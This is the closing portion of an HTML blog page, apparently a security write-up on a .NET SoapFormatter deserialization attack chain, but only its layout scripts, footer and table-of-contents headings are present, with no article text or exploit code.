          var imgElem = element.querySelector('img');
          var imgSrc = imgElem.getAttribute('data-src') || imgElem.getAttribute('src');
          var img = await imageLoad(imgSrc);
          imgElem.style.width = img.width + 'px';
          imgElem.style.height = img.height + 'px';

          
          if (captionElem && imgElem) {
            var caption = null;
            if (imgElem.getAttribute('data-caption')) {
              caption = imgElem.getAttribute('data-caption');
            } else if (imgElem.getAttribute('title')) {
              caption = imgElem.getAttribute('title');
            } else if (imgElem.getAttribute('alt')) {
              caption = imgElem.getAttribute('alt');
            } else {
              caption = imgElem.getAttribute('src');
            }

            captionElem.querySelector('.modal__caption--text').innerText = caption;
            pagingElem.innerText = (index + 1) + ' / ' + imgTotalNum;

            clearTimeout(myFadeTimeout);
            fadeIn(itemsElem, 200);
          }
        },
      });

      fadeIn(itemsElem);

      
      if (captionElem) {
        var caption = null;
        if (e.target.getAttribute('data-caption')) {
          caption = e.target.getAttribute('data-caption');
        } else if (e.target.getAttribute('title')) {
          caption = e.target.getAttribute('title');
        } else if (e.target.getAttribute('alt')) {
          caption = e.target.getAttribute('alt');
        } else {
          caption = e.target.getAttribute('src');
        }

        captionElem.querySelector('.modal__caption--text').innerText = caption;
        pagingElem.innerText = (idx + 1) + ' / ' + imgTotalNum;
      }

      if (normalElem && fullElem) {
        normalElem.style.zIndex = -1;
        normalElem.style.opacity = 0;
        fullElem.style.zIndex = 25;
        fullElem.style.opacity = 1;
      }
    });

    window.addEventListener('keydown', keydownFunction);
  });

  arrowLeftElem ?
    arrowLeftElem.addEventListener('click', function (e) {
      if (mySwipe) {
        mySwipe.prev();
      }
    }) : null;
  arrowRightElem ?
    arrowRightElem.addEventListener('click', function (e) {
      if (mySwipe) {
        mySwipe.next();
      }
    }) : null;

  closeElem ?
    closeElem.addEventListener('click', function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }
      closeFullscreen();
      MicroModal.close('modal');
    }) : null;

  fullElem ?
    fullElem.addEventListener('click', function (e) {
      openFullscreen();
      if (normalElem) {
        normalElem.style.zIndex = 25;
        normalElem.style.opacity = 1;
        fullElem.style.zIndex = -1;
        fullElem.style.opacity = 0;
      }
    }) : null;

  normalElem ?
    normalElem.addEventListener('click', function (e) {
      closeFullscreen();
      if (fullElem) {
        fullElem.style.zIndex = 25;
        fullElem.style.opacity = 1;
        normalElem.style.zIndex = -1;
        normalElem.style.opacity = 0;
      }
    }) : null;
  
});
</script>

    <div class="hide">
      

<div class="search">
  <span class="icon">
    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="currentColor" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path d="M15.5 14h-.79l-.28-.27c1.2-1.4 1.82-3.31 1.48-5.34-.47-2.78-2.79-5-5.59-5.34-4.23-.52-7.79 3.04-7.27 7.27.34 2.8 2.56 5.12 5.34 5.59 2.03.34 3.94-.28 5.34-1.48l.27.28v.79l4.25 4.25c.41.41 1.08.41 1.49 0 .41-.41.41-1.08 0-1.49L15.5 14zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
  </span>
  <input id="search" aria-label="Site Search" class="input" type="text" placeholder="Search" autocomplete="off">
  <div id="search-results" class="dropdown">
    <div id="search-menu" class="dropdown-menu" role="menu">
    </div>
  </div>
</div>


    </div>
  </div>
</main>


<script>
  
  
  

  var enableToc = JSON.parse("true");
  var toc = JSON.parse("null");
  var tocPosition = JSON.parse("\"outer\"");
  
  var singleMainElem = document.querySelector('.single__main');
  var singleSideElem = document.querySelector('.single__side');

  enquire.register("screen and (max-width: 769px)", {
    match: function () {
      if ((enableToc || toc) && tocPosition !== "outer") {
        if (singleMainElem && singleSideElem) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
          singleSideElem.classList.remove('main-side');
          singleSideElem.classList.add('hide');
        }
      } else if (tocPosition === "outer") {
        if (singleMainElem && !singleMainElem.classList.contains('main-main')) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
        }
        if (singleSideElem && !singleSideElem.classList.contains('hide')) {
          singleSideElem.classList.add('hide');
        }
      }
    },
    unmatch: function () {
      if ((enableToc || toc) && tocPosition !== "outer") {
        singleMainElem.classList.remove('main');
        singleMainElem.classList.add('main-main');
        singleSideElem.classList.remove('hide');
        singleSideElem.classList.add('main-side');
      } else if (tocPosition === "outer") {
        if (singleMainElem && !singleMainElem.classList.contains('main-main')) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
        }
        if (singleSideElem && !singleSideElem.classList.contains('hide')) {
          singleSideElem.classList.add('hide');
        }
      }

      var navCollapseBtn = document.querySelector('.navbar__burger');
      var navCollapse = document.getElementsByClassName('navbarm__collapse')[0];
      if (navCollapse) {
        navCollapse.setAttribute('data-open', false);
        navCollapse.style.maxHeight = 0;
        navCollapseBtn.classList.remove('is-active');
      }
      document.getElementsByClassName('navbar__menu')[0].classList.remove('is-active');
      document.getElementsByClassName('mobile-search')[0].classList.add('hide');
    },
    setup: function () { },
    deferSetup: true,
    destroy: function () { },
  });
</script>





<script defer src="/js/helper/getParents.min.js"></script>

<script defer src="/js/helper/closest.min.js"></script>

<script defer src="/js/helper/prev.min.js"></script>

<script defer src="/js/helper/prop.min.js"></script>

<script defer src="/js/helper/fadeinout.min.js"></script>

<script defer src="/js/helper/throttle.min.js"></script>



















































<script>
  'use strict';

  window.onload = function() {
    var navbar = document.querySelector('.navbar');
    var singleContentsElem = document.querySelector('.single__contents');

    
    
    
    var enableBusuanzi = JSON.parse("false");
    var busuanziPagePV = JSON.parse("true");
    
    if (enableBusuanzi && busuanziPagePV) {
      var pagePvElem = document.querySelector('#busuanzi_value_page_pv');
      pagePvElem.textContent = pagePvElem.textContent.replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
    }    
    



    
    
    
    
    
    
    var enableToc = JSON.parse("true");
    var toc = JSON.parse("null");
    var hideToc = JSON.parse("false");
    var tocFlexbox = document.querySelector('.toc__flexbox');
    var tocFlexboxOuter = document.querySelector('.toc__flexbox--outer');
    var tocFolding = JSON.parse("true");
    
    if ((enableToc || toc) && document.querySelector('.toc')) {
      var tableOfContentsElem = document.querySelector('.toc').querySelector('#TableOfContents');

      tableOfContentsElem.onmouseenter = function() {
        if (navbar.classList.contains('scrolling')) {
          navbar.classList.remove('scrolling');
        }
      }

      tableOfContentsElem.onmouseleave = function() {
        if (!navbar.classList.contains('scrolling')) {
          navbar.classList.add('scrolling');
        }
      }

      if (false === tocFolding) {

      } else {
        tableOfContentsElem.querySelectorAll('ul') ?
          tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
            rootUl.querySelectorAll('li').forEach(function (liElem) {
              liElem.querySelectorAll('ul').forEach(function (ulElem) {
                ulElem.style.display = 'none';
              });
            });
          }) : null;
      }

      if (tableOfContentsElem) {
        if (tableOfContentsElem.querySelectorAll('a').length > 0) {
          tableOfContentsElem.querySelectorAll('a').forEach(function (elem) {
            elem.addEventListener('click', function () {
              var id = elem.getAttribute('id');

              if (!navbar.classList.contains('scrolling')) {
                navbar.classList.remove('navbar--show');
                navbar.classList.remove('navbar--hide');
                navbar.classList.add('navbar--hide');
              }
              
              document.querySelector('.toc').querySelectorAll('a').forEach(function (elem) {
                elem.classList.remove('active');
              });
              elem.classList.add('active');

              var curElem = tableOfContentsElem.querySelector('[href="#' + id + '"]');
              if (curElem && curElem.nextElementSibling) {
                curElem.nextElementSibling.style.display = 'block';
              }
              if (curElem) {
                getParents(curElem, 'ul') ?
                  getParents(curElem, 'ul').forEach(function (elem) {
                    elem.style.display = 'block';
                  }) : null;
              }
            });
          });
        } else {
          if (tocFlexbox) {
            tocFlexbox.setAttribute('data-position', '');
            if (!tocFlexbox.classList.contains('hide')) {
              tocFlexbox.classList.add('hide');
            }
          }
          if (tocFlexboxOuter) {
            tocFlexboxOuter.setAttribute('data-position', '');
            if (!tocFlexboxOuter.classList.contains('hide')) {
              tocFlexboxOuter.classList.add('hide');
            }
          }
        }
      }

      
      var toggleTocElem = document.getElementById("toggle-toc");
      var visibleTocElem = document.getElementById('visible-toc');
      var tocElem = document.querySelector('.toc');
      var mainElem = document.querySelector('main');
      var sideElem = document.querySelector('side');
      var tocFlexboxElem = document.querySelector('.toc__flexbox');

      toggleTocElem ? 
      toggleTocElem.addEventListener('change', function(e) {
        if (e.target.checked) {
          if (tocElem) {
            fadeIn(tocElem, 200);
          }
          if (tocFlexboxElem) {
            tocFlexboxElem.setAttribute('data-position', 'fixed');
          }

          if (mainElem) {
            mainElem.classList.remove('main-main');
            mainElem.classList.remove('main');
            mainElem.classList.add('main-main');
          }
          if (sideElem) {
            sideElem.classList.remove('main-side');
          }
        } else {
          if (tocElem) {
            fadeOut(tocElem, 200);
          }
          if (tocFlexboxElem) {
            tocFlexboxElem.setAttribute('data-position', 'absolute');
          }

          if (mainElem) {
            mainElem.classList.remove('main-main');
            mainElem.classList.remove('main');
            mainElem.classList.add('main');
          }
          if (sideElem) {
            sideElem.classList.remove('main-side');
          }
        }
      }) : null;

      visibleTocElem ?
      visibleTocElem.addEventListener('change', function(e) {
        if (e.target.checked) {
          if (tocElem) {
            fadeIn(tocElem, 200);
          }
        } else {
          if (tocElem) {
            fadeOut(tocElem, 200);
          }
        }
      }) : null;
    }
    
    
    
    
    
    var topOffset = 120;
    var botOffset = 70;
    var handleWindowResize = function () {
      if (tocElem) {
        tocElem.style.maxHeight = (window.innerHeight - topOffset - botOffset) + 'px';
      }
    }
    var throttledWindowResize = throttle(handleWindowResize, 300);
    throttledWindowResize()

    
    window.addEventListener('resize', throttledWindowResize);
    



    
    var text, clip = new ClipboardJS('.anchor');
    var headers = singleContentsElem.querySelectorAll("h1, h2, h3, h4");

    
    var languagedir = JSON.parse("\"ltr\"");

    headers ? 
    headers.forEach(function (elem) {
      var size = parseInt(elem.tagName.substr(1), 10) * 2;
      var url = encodeURI(document.location.origin + document.location.pathname);
      var link = url + "#" + elem.getAttribute('id');
      var newElemOuter = document.createElement('span');
      newElemOuter.classList.add('anchor');
      newElemOuter.classList.add('hide');
      newElemOuter.setAttribute('data-clipboard-text', decodeURI(link));
      newElemOuter.style.position = 'relative';

      var newElemInner = document.createElement('span');
      newElemInner.style.position = 'absolute';
      newElemInner.style.top = '50%';
      newElemInner.style.left = '0.75rem';
      newElemInner.style.transform = 'translateY(-50%)';
      newElemInner.innerHTML = `
<svg fill="currentColor" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="${32 - size}px" height="${32 - size}px"><path d="M 5.5625 0 C 4.136719 0 2.707031 0.542969 1.625 1.625 C -0.539063 3.789063 -0.539063 7.335938 1.625 9.5 L 5.28125 13.15625 C 5.667969 13.554688 6.304688 13.558594 6.703125 13.171875 C 7.101563 12.785156 7.105469 12.148438 6.71875 11.75 L 3.03125 8.0625 C 1.632813 6.664063 1.632813 4.429688 3.03125 3.03125 C 4.429688 1.632813 6.664063 1.632813 8.0625 3.03125 L 12.96875 7.9375 C 14.367188 9.335938 14.367188 11.570313 12.96875 12.96875 C 12.804688 13.132813 12.621094 13.25 12.4375 13.375 C 11.980469 13.6875 11.859375 14.308594 12.171875 14.765625 C 12.484375 15.222656 13.105469 15.34375 13.5625 15.03125 C 13.847656 14.835938 14.125 14.625 14.375 14.375 C 16.539063 12.210938 16.539063 8.664063 14.375 6.5 L 9.5 1.625 C 8.417969 0.542969 6.988281 0 5.5625 0 Z M 10.78125 8.875 C 10.738281 8.882813 10.695313 8.894531 10.65625 8.90625 C 10.507813 8.9375 10.371094 9 10.25 9.09375 C 10.039063 9.253906 9.820313 9.429688 9.625 9.625 C 7.460938 11.789063 7.460938 15.335938 9.625 17.5 L 14.5 22.375 C 16.664063 24.539063 20.210938 24.539063 22.375 22.375 C 24.539063 20.210938 24.539063 16.664063 22.375 14.5 L 18.71875 10.875 C 18.476563 10.578125 18.089844 10.441406 17.714844 10.527344 C 17.34375 10.613281 17.050781 10.90625 16.964844 11.277344 C 16.878906 11.652344 17.015625 12.039063 17.3125 12.28125 L 20.96875 15.9375 C 22.367188 17.335938 22.367188 19.570313 20.96875 20.96875 C 19.570313 22.367188 17.335938 22.367188 15.9375 20.96875 L 11.03125 16.0625 C 9.632813 14.664063 9.632813 12.429688 11.03125 11.03125 C 11.152344 10.90625 11.300781 10.820313 11.4375 10.71875 C 11.839844 10.472656 12.015625 9.976563 11.855469 9.53125 C 11.699219 9.085938 11.25 8.8125 10.78125 8.875 Z"/></svg>`;

      if (languagedir === "rtl") {
        newElemInner.style.left = '-2rem';
      } else {
        newElemInner.style.right = '-2rem';
      }

      newElemOuter.append(newElemInner);
      elem.append(newElemOuter);

      elem.addEventListener('mouseenter', function() {
        this.querySelector('.anchor').classList.remove('hide');
      });
      elem.addEventListener('mouseleave', function () {
        this.querySelector('.anchor').classList.add('hide');
      });
    }) : null;

    document.querySelectorAll('.anchor').forEach(function(elem) {
      elem.addEventListener('mouseleave', function() {
        elem.setAttribute('aria-label', null);
        elem.classList.remove('tooltipped');
        elem.classList.remove('tooltipped-s');
        elem.classList.remove('tooltipped-w');
      });
    });

    clip.on('success', function (e) {
      e.clearSelection();
      e.trigger.setAttribute('aria-label', 'Link copied to clipboard!');
      e.trigger.classList.add('tooltipped');
      e.trigger.classList.add('tooltipped-s');
    });
    



    
    
    var lib = JSON.parse("null");

    if (lib && lib.includes('mermaid')) {
      
      var themeVariant = localStorage.getItem('theme') || JSON.parse("\"dark\"");

      if (themeVariant === "dark" || themeVariant === "hacker") {
        mermaid.initialize({ theme: 'dark' });
      } else {
        mermaid.initialize({ theme: 'default' });
      }
      
      var mermaids = [];
      [].push.apply(mermaids, document.getElementsByClassName('language-mermaid'));
      mermaids.forEach(function(elem) {
        var elemParentNode = elem.parentNode;

        if (elemParentNode !== document.body) {
          elemParentNode.parentNode.insertBefore(elem, elemParentNode);
          elemParentNode.parentNode.removeChild(elemParentNode);
        }

        var newElemWrapper = document.createElement('div');
        newElemWrapper.classList.add('mermaid');
        newElemWrapper.style.padding = '34px 4px 6px';
        newElemWrapper.innerHTML = elem.innerHTML;
        elem.replaceWith(newElemWrapper);
      });
    }
    

    

    
    if (lib && lib.includes('katex')) {
      var mathElements = document.getElementsByClassName('math');
      var options = {
        delimiters: [
          { left: "$$", right: "$$", display: true },
          { left: "\\[", right: "\\]", display: true },
          { left: "$", right: "$", display: false },
          { left: "\\(", right: "\\)", display: false }
        ],
      };

      renderMathInElement(document.querySelector('.single__contents'), options);
    }
    



    
    if (lib && lib.includes('flowchartjs')) {
      
      var options = JSON.parse("{\"arrow-end\":\"block\",\"element-color\":\"black\",\"fill\":\"white\",\"flowstate\":{\"approved\":{\"fill\":\"#58C4A3\",\"font-size\":12,\"no-text\":\"n/a\",\"yes-text\":\"APPROVED\"},\"current\":{\"fill\":\"yellow\",\"font-color\":\"red\",\"font-weight\":\"bold\"},\"future\":{\"fill\":\"#FFFF99\"},\"invalid\":{\"fill\":\"#444444\"},\"past\":{\"fill\":\"#CCCCCC\",\"font-size\":12},\"rejected\":{\"fill\":\"#C45879\",\"font-size\":12,\"no-text\":\"REJECTED\",\"yes-text\":\"n/a\"},\"request\":{\"fill\":\"blue\"}},\"font-color\":\"black\",\"font-size\":14,\"line-color\":\"black\",\"line-length\":50,\"line-width\":3,\"no-text\":\"no\",\"scale\":1,\"symbols\":{\"end\":{\"class\":\"end-element\"},\"start\":{\"element-color\":\"green\",\"fill\":\"yellow\",\"font-color\":\"red\"}},\"text-margin\":10,\"x\":0,\"y\":0,\"yes-text\":\"yes\"}");
      var jsonContent = null;

      var flowchartPrefix = "language-flowchart";
      var index = 0;
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + flowchartPrefix + "]"), function(x){
          x.style.display = 'none'
          x.parentNode.style.backgroundColor = "transparent"
          jsonContent = x.innerText;

          var node0 = document.createElement('div');
          node0.id = 'flowchart' + index;
          x.parentNode.insertBefore(node0, x);

          var diagram = flowchart.parse(jsonContent);
          diagram.drawSVG("flowchart"+index, options);

          index +=1;
      });      
    }
    

    

    
    document.querySelectorAll("mjx-container").forEach(function (x) {
      x.parentElement.classList += 'has-jax'
    });
    



    
    if (lib && lib.includes('msc')) {
      
      var options = JSON.parse("{\"theme\":\"hand\"}");
      var jsonContent = null;

      var index = 0;
      var chartPrefix = "language-msc";
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + chartPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('div');
        node0.id = 'msc' + index;
        x.parentNode.insertBefore(node0, x);
        var diagram = Diagram.parse(jsonContent);
        diagram.drawSVG("msc" + index, options);
        index += 1;
      });
    }
    



    
    if (lib && lib.includes('chart')) {
      var borderColor = "#666";
      var bgColor = "#ddd";
      var borderWidth = 2;

      Chart.defaults.global.elements.rectangle.borderWidth = borderWidth;
      Chart.defaults.global.elements.rectangle.borderColor = borderColor;
      Chart.defaults.global.elements.rectangle.backgroundColor = bgColor;

      Chart.defaults.global.elements.line.borderWidth = borderWidth;
      Chart.defaults.global.elements.line.borderColor = borderColor;
      Chart.defaults.global.elements.line.backgroundColor = bgColor;

      Chart.defaults.global.elements.point.borderWidth = borderWidth;
      Chart.defaults.global.elements.point.borderColor = borderColor;
      Chart.defaults.global.elements.point.backgroundColor = bgColor;

      var chartPrefix = "language-chart";
      var index = 0;
      var jsonContent = null;

      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + chartPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('canvas');
        var source = null;
        node0.height = 200;
        node0.style.height = 200;
        node0.id = 'myChart' + index;
        source = JSON.parse(jsonContent);
        x.parentNode.insertBefore(node0, x);
        var ctx = document.getElementById('myChart' + index).getContext('2d');
        var myChart = new Chart(ctx, source);
        index += 1;
      });            
    }
    



    
    if (lib && lib.includes('wavedrom')) {
      var wavePrefix = "language-wave";
      var index = 0;
      var jsonContent = null;
      
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + wavePrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('div');
        var source = null;
        node0.id = 'WaveDrom_Display_' + index;
        source = JSON.parse(jsonContent);
        x.parentNode.insertBefore(node0, x);
        WaveDrom.RenderWaveForm(index, source, "WaveDrom_Display_");
        index += 1;
      });
    }
    



    
    if (lib && lib.includes('viz')) {
      var vizPrefix = "language-viz-";
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + vizPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        var engine;
        x.getAttribute("class").split(" ").forEach(function (cls) {
          if (cls.startsWith(vizPrefix)) {
            engine = cls.substr(vizPrefix.length);
          }
        });
        var viz = new Viz();
        viz.renderSVGElement(x.innerText, { engine: engine })
          .then(function (element) {
            element.style.width = "100%";
            x.parentNode.insertBefore(element, x);
          })
      });
    }
    
    
  }
</script>


            
            <footer class="footer">
    
    
<div class="footer__social">
  <div class="social">
    
            
    
            
    
            
    
      
      <a href="mailto:edisc.ctf@gmail.com" title="email" aria-label="email">
        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-.4 4.25l-7.07 4.42c-.32.2-.74.2-1.06 0L4.4 8.25c-.25-.16-.4-.43-.4-.72 0-.67.73-1.07 1.3-.72L12 11l6.7-4.19c.57-.35 1.3.05 1.3.72 0 .29-.15.56-.4.72z"/></svg>
      </a>
            
    
      
      <a href="https://www.facebook.com/minhlongv84" title="facebook" aria-label="facebook">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" version="1.1">
<g id="surface2747">
<path fill="currentColor" d="M 11.664062 2.003906 C 6.621094 2.171875 2.375 6.25 2.023438 11.289062 C 1.65625 16.617188 5.46875 21.121094 10.507812 21.878906 L 10.507812 14.648438 L 8.890625 14.648438 C 8.164062 14.648438 7.578125 14.0625 7.578125 13.335938 C 7.578125 12.609375 8.164062 12.023438 8.890625 12.023438 L 10.503906 12.023438 L 10.503906 10.273438 C 10.503906 7.378906 11.914062 6.105469 14.324219 6.105469 C 14.679688 6.105469 14.984375 6.113281 15.242188 6.128906 C 15.878906 6.15625 16.371094 6.6875 16.371094 7.324219 C 16.371094 7.988281 15.835938 8.523438 15.171875 8.523438 L 14.730469 8.523438 C 13.710938 8.523438 13.351562 9.492188 13.351562 10.585938 L 13.351562 12.023438 L 15.222656 12.023438 C 15.8125 12.023438 16.265625 12.550781 16.175781 13.132812 L 16.066406 13.835938 C 15.992188 14.304688 15.589844 14.652344 15.113281 14.652344 L 13.351562 14.652344 L 13.351562 21.898438 C 18.234375 21.234375 22 17.0625 22 12 C 22 6.367188 17.339844 1.820312 11.664062 2.003906 Z M 11.664062 2.003906 "/>
</g>
</svg>

      </a>
            
    
            
    
      
      <a href="https://github.com/minhlongmt183/" title="github" aria-label="github">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" version="1.1">
<g id="surface3680">
<path fill="currentColor" d="M 10.898438 2.101562 C 6.300781 2.601562 2.601562 6.300781 2.101562 10.800781 C 1.601562 15.5 4.300781 19.699219 8.398438 21.300781 C 8.699219 21.398438 9 21.199219 9 20.800781 L 9 19.199219 C 9 19.199219 8.601562 19.300781 8.101562 19.300781 C 6.699219 19.300781 6.101562 18.101562 6 17.398438 C 5.898438 17 5.699219 16.699219 5.398438 16.398438 C 5.101562 16.300781 5 16.300781 5 16.199219 C 5 16 5.300781 16 5.398438 16 C 6 16 6.5 16.699219 6.699219 17 C 7.199219 17.800781 7.800781 18 8.101562 18 C 8.5 18 8.800781 17.898438 9 17.800781 C 9.101562 17.101562 9.398438 16.398438 10 16 C 7.699219 15.5 6 14.199219 6 12 C 6 10.898438 6.5 9.800781 7.199219 9 C 7.101562 8.800781 7 8.300781 7 7.601562 C 7 7.199219 7 6.601562 7.300781 6 C 7.300781 6 8.699219 6 10.101562 7.300781 C 10.601562 7.101562 11.300781 7 12 7 C 12.699219 7 13.398438 7.101562 14 7.300781 C 15.300781 6 16.800781 6 16.800781 6 C 17 6.601562 17 7.199219 17 7.601562 C 17 8.398438 16.898438 8.800781 16.800781 9 C 17.5 9.800781 18 10.800781 18 12 C 18 14.199219 16.300781 15.5 14 16 C 14.601562 16.5 15 17.398438 15 18.300781 L 15 20.898438 C 15 21.199219 15.300781 21.5 15.699219 21.398438 C 19.398438 19.898438 22 16.300781 22 12.101562 C 22 6.101562 16.898438 1.398438 10.898438 2.101562 Z M 10.898438 2.101562 "/>
</g>
</svg>

      </a>
            
    
            
    
            
    
            
    
            
    
            
    
      
      <a href="https://www.linkedin.com/in/long-v%C3%B5-minh-58374318b/" title="linkedin" aria-label="linkedin">
        <svg xmlns="http://www.w3.org/2000/svg" fill="#000000" viewBox="0 0 30 30" width="32" height="32"><path fill="currentColor" d="M24,4H6C4.895,4,4,4.895,4,6v18c0,1.105,0.895,2,2,2h18c1.105,0,2-0.895,2-2V6C26,4.895,25.105,4,24,4z M10.954,22h-2.95 v-9.492h2.95V22z M9.449,11.151c-0.951,0-1.72-0.771-1.72-1.72c0-0.949,0.77-1.719,1.72-1.719c0.948,0,1.719,0.771,1.719,1.719 C11.168,10.38,10.397,11.151,9.449,11.151z M22.004,22h-2.948v-4.616c0-1.101-0.02-2.517-1.533-2.517 c-1.535,0-1.771,1.199-1.771,2.437V22h-2.948v-9.492h2.83v1.297h0.04c0.394-0.746,1.356-1.533,2.791-1.533 c2.987,0,3.539,1.966,3.539,4.522V22z"/></svg>

      </a>
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
      
      <a href="https://twitter.com/edisc_1" title="twitter" aria-label="twitter">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 32 32" version="1.1">
<g id="surface676">
<path fill="currentColor" d="M 28 8.558594 C 27.117188 8.949219 26.167969 9.214844 25.171875 9.332031 C 26.1875 8.722656 26.96875 7.757812 27.335938 6.609375 C 26.386719 7.171875 25.332031 7.582031 24.210938 7.804688 C 23.3125 6.847656 22.03125 6.246094 20.617188 6.246094 C 17.898438 6.246094 15.691406 8.453125 15.691406 11.171875 C 15.691406 11.558594 15.734375 11.933594 15.820312 12.292969 C 11.726562 12.089844 8.097656 10.128906 5.671875 7.148438 C 5.246094 7.875 5.003906 8.722656 5.003906 9.625 C 5.003906 11.332031 5.871094 12.839844 7.195312 13.722656 C 6.386719 13.695312 5.628906 13.476562 4.964844 13.105469 C 4.964844 13.128906 4.964844 13.148438 4.964844 13.167969 C 4.964844 15.554688 6.660156 17.546875 8.914062 17.996094 C 8.5 18.109375 8.066406 18.171875 7.617188 18.171875 C 7.300781 18.171875 6.988281 18.140625 6.691406 18.082031 C 7.316406 20.039062 9.136719 21.460938 11.289062 21.503906 C 9.605469 22.824219 7.480469 23.609375 5.175781 23.609375 C 4.777344 23.609375 4.386719 23.585938 4 23.539062 C 6.179688 24.9375 8.765625 25.753906 11.546875 25.753906 C 20.605469 25.753906 25.558594 18.25 25.558594 11.742188 C 25.558594 11.53125 25.550781 11.316406 25.542969 11.105469 C 26.503906 10.410156 27.339844 9.542969 28 8.558594 Z M 28 8.558594 "/>
</g>
</svg>

      </a>
            
    
            
    
            
    
            
    
            
    
            
    
    
  
  
    
      <a href="https://minhlongmt183.github.io/posts/index.xml" type="application/rss+xml" title="RSS" aria-label="RSS Feed Link">
        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><circle fill="currentColor" cx="6.18" cy="17.82" r="2.18"/><path fill="currentColor" d="M5.59 10.23c-.84-.14-1.59.55-1.59 1.4 0 .71.53 1.28 1.23 1.4 2.92.51 5.22 2.82 5.74 5.74.12.7.69 1.23 1.4 1.23.85 0 1.54-.75 1.41-1.59-.68-4.2-3.99-7.51-8.19-8.18zm-.03-5.71C4.73 4.43 4 5.1 4 5.93c0 .73.55 1.33 1.27 1.4 6.01.6 10.79 5.38 11.39 11.39.07.73.67 1.28 1.4 1.28.84 0 1.5-.73 1.42-1.56-.73-7.34-6.57-13.19-13.92-13.92z"/></svg>
      </a>
    
  


  </div>
</div>

    
<div id="gtt">
  <div class="gtt">
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M8.12 14.71L12 10.83l3.88 3.88c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L12.7 8.71c-.39-.39-1.02-.39-1.41 0L6.7 13.3c-.39.39-.39 1.02 0 1.41.39.38 1.03.39 1.42 0z"/></svg>
  </div>
</div>

    <hr />

    <div class="basicflex flexwrap">
        
            
        
            
        
    </div>

    <div class="footer__poweredby">
        
                
            <p class="caption">
                
                    ©2025, All Rights Reserved
                
            </p>
        

        
            <p class="caption">Powered by <a href="https://gohugo.io/" target="_blank" rel="noreferrer">Hugo</a> and the <a href="https://github.com/zzossig/hugo-theme-zzo" target="_blank" rel="noreferrer">Zzo theme</a></p>
        
        
    </div> 
</footer>
        </div>
        





<div class="wrapper__right hide" data-pad="true" dir="ltr">
  <script>document.querySelector('.wrapper__right').classList.remove('hide')</script>
  
    
      
        <div class="toc__flexbox--outer" data-position="fixed" data-dir="ltr" data-ani="true">
          <h6 class="toc__title toc__title--outer" data-ani="true">What&#39;s on this Page</h6>
          
          <label class="switch" data-ani="true">
            <input id="visible-toc" aria-label="Visible TOC" type="checkbox" checked>
            <span class="slider round"></span>
          </label>
          
        </div>
        <div class="toc toc__outer " data-dir="ltr" data-folding="true" data-ani="true">
          <nav id="TableOfContents">
  <ul>
    <li><a href="#i-soapformatter">I <strong><strong>SoapFormatter</strong></strong></a></li>
    <li><a href="#ii-net-objects-và-soap-streams">II <strong><strong>.NET Objects và SOAP Streams</strong></strong></a></li>
    <li><a href="#iii-activitysurrogateselector">III <strong><strong>ActivitySurrogateSelector</strong></strong></a>
      <ul>
        <li><a href="#1-background-iserializationsurrogate-and-surrogateselector">1. [background] ISerializationSurrogate and SurrogateSelector</a></li>
        <li><a href="#2-activitysurrogateselector">2. <strong><strong>ActivitySurrogateSelector</strong></strong></a></li>
      </ul>
    </li>
    <li><a href="#iv-linq-knowledge">IV LINQ Knowledge</a></li>
    <li><a href="#v-attack-chain">V Attack chain</a>
      <ul>
        <li><a href="#1-ienumerable-to-linq-exploit-chaining">1. <strong><strong>IEnumerable to LINQ exploit chaining</strong></strong></a></li>
        <li><a href="#2-fom-tostring-to-ienumerable">2. Fom ToString to IEnumerable</a></li>
        <li><a href="#3-hashtable-to-tostring">3. HashTable to ToString</a></li>
        <li><a href="#4-systemwindowsformsaxhoststate-handling">4. <strong><strong>System.Windows.Forms.AxHost.State handling</strong></strong></a></li>
      </ul>
    </li>
    <li><a href="#vi-tổng-kết">VI Tổng kết</a></li>
    <li><a href="#vii-nguồn-tham-khảo">VII Nguồn tham khảo</a></li>
  </ul>
</nav>
        </div>
      
    
  
</div>

    </div>
</body>

</html>